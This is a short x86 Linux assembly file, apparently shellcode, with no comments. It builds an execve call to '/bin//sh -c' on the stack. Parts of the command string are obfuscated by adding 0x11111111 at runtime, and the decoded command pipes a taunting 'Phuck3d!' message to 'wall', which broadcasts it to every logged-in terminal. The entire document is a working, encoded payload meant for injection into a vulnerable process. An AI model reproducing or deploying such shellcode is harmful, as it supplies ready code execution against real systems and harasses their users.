global _start			

section .text
_start:

xor eax,eax   
push eax
push 0x6c6c6177
mov esi,0xF6B0F10
add esi,0x11111111
push esi
push 0x64336b63
push 0x75685020
mov esi, 0x534627F8
add esi, 0x11111111
push esi
push 0x6f686365
mov esi,esp
push eax
mov word [esp-4],0x632d
sub esp,4
mov ecx,esp
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
push eax
push esi
push ecx
push ebx
add eax,0xb
mov ecx,esp
int 0x80
